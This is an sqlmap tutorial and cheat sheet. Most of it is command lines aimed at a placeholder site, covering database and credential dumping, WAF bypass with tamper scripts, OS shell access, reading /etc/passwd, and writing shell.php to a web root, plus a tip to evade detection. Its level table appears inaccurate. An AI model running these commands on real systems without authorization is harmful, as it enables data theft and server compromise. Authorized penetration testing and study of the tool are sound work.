#sqlmap

# SQLmap Overview

## What is SQLmap?

SQLmap is an open-source automatic SQL injection testing tool. It automates the detection and exploitation of SQL injection vulnerabilities in web applications.

It is commonly used by:

- Penetration testers
- Security researchers
- Bug bounty hunters
- Web application security professionals
- Database administrators

SQLmap can:

- Detect SQL injection vulnerabilities
- Exploit vulnerable parameters automatically
- Extract database contents
- Identify database management systems
- Dump user credentials and sensitive data
- Execute operating system commands
- Bypass Web Application Firewalls (WAF)

---

## Key Features

- **Automated**: Detects and exploits SQL injection without manual intervention
- **Comprehensive**: Supports multiple SQL injection techniques (Boolean, Time-based, Error-based, Union-based, etc.)
- **Flexible**: Works with GET, POST, cookies, headers, and other parameters
- **Smart**: Learns application behavior and adapts attack strategy
- **Powerful**: Can read files, execute commands, and interact with the OS

---

# Installing SQLmap on Linux

## Ubuntu / Debian

```bash
sudo apt update
sudo apt install sqlmap -y
```

## Fedora

```bash
sudo dnf install sqlmap
```

## Arch Linux

```bash
sudo pacman -S sqlmap
```

## From Source (Latest Version)

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
chmod +x sqlmap.py
sudo ln -s $(pwd)/sqlmap.py /usr/local/bin/sqlmap
```

---

## Verify Installation

```bash
sqlmap --version
```

---

# Basic Terminology

| Term | Meaning |
|---|---|
| SQL Injection | Inserting malicious SQL code into input fields |
| Parameter | Input field or variable being tested |
| Payload | Malicious input designed to trigger vulnerability |
| Database | Backend system storing application data |
| WAF | Web Application Firewall protecting the target |
| Authentication Bypass | Circumventing login controls |
| Data Exfiltration | Extracting sensitive information |

---

# SQL Injection Techniques

| Technique | Description | Detection Speed |
|---|---|---|
| Boolean-based | Infers data from true/false responses | Slow |
| Time-based | Uses delays to infer data | Slow |
| Error-based | Extracts data from error messages | Fast |
| Union-based | Uses UNION operator to append data | Fast |
| Stacked queries | Executes multiple SQL statements | Medium |

---

# Basic Usage

## Simple URL Testing

```bash
sqlmap -u "http://target.com/page.php?id=1"
```

Example output:

```text
[*] Testing GET parameter 'id'
[*] Testing 'AND boolean-based blind - WHERE or HAVING clause'
[+] GET parameter 'id' is vulnerable to SQL injection attacks
[*] The back-end DBMS is MySQL
```

---

## POST Request Testing

```bash
sqlmap -u "http://target.com/login.php" --data "username=admin&password=pass"
```

---

## Testing Specific Parameter

```bash
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id
```

---

## Extract Database Information

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

---

## Dump Tables from Database

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```

---

## Extract User Data

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
```

---

# Common Flags Reference

| Flag | Purpose | Example |
|---|---|---|
| `-u` | Target URL | `-u http://target.com/page.php?id=1` |
| `--data` | POST data | `--data "user=admin&pass=test"` |
| `-p` | Parameter to test | `-p id` |
| `--dbs` | Enumerate databases | `--dbs` |
| `-D` | Database to target | `-D wordpress` |
| `--tables` | List tables in database | `--tables` |
| `-T` | Table to target | `-T users` |
| `--dump` | Dump table contents | `--dump` |
| `--dump-all` | Dump all databases | `--dump-all` |
| `-r` | Load request from file (Burp) | `-r request.txt` |
| `--proxy` | Use HTTP proxy | `--proxy http://127.0.0.1:8080` |
| `--random-agent` | Use random User-Agent | `--random-agent` |
| `--technique` | SQL injection technique | `--technique=BEUSTQ` |
| `--os-shell` | Prompt for OS shell access | `--os-shell` |
| `-v` | Verbosity level (0-6) | `-v 1` |
| `--batch` | Never ask for user input | `--batch` |

---

# Advanced Usage Examples

## Testing with Custom Headers

```bash
sqlmap -u "http://target.com/page.php?id=1" -H "Authorization: Bearer token123"
```

## Testing with Cookies

```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie "session=abc123"
```

## Bypass WAF with Tamper Scripts

```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
```

## Load Request from Burp Suite

```bash
sqlmap -r request.txt --dbs
```

## OS Command Execution

```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

## Read Local File

```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
```

## Write to Disk

```bash
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/"
```

## Specify SQL Injection Technique

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=EU
```

## Aggressive Scanning

```bash
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

---

# Risk and Level Options

| Level | Tests Performed |
|---|---|
| 1 | Basic tests (default) |
| 2 | Includes common injection tests |
| 3 | Adds boolean-based blind tests |
| 4 | Includes time-based blind tests |
| 5 | Maximum tests (comprehensive) |

| Risk | Impact |
|---|---|
| 1 | No risk (default) |
| 2 | Medium risk (may cause issues) |
| 3 | High risk (may damage data) |

---

# Tips and Best Practices

- ✅ Always get written permission before testing
- ✅ Start with --level=1 and --risk=1
- ✅ Use `--batch` to automate responses
- ✅ Save results for documentation
- ✅ Test single parameters before full URL
- ✅ Use `--random-agent` to avoid detection
- ✅ Use proxies for traffic inspection
- ✅ Read error messages for database information
- ❌ Don't use high risk levels on production systems
- ❌ Don't dump entire databases unnecessarily
- ❌ Don't scan without authorization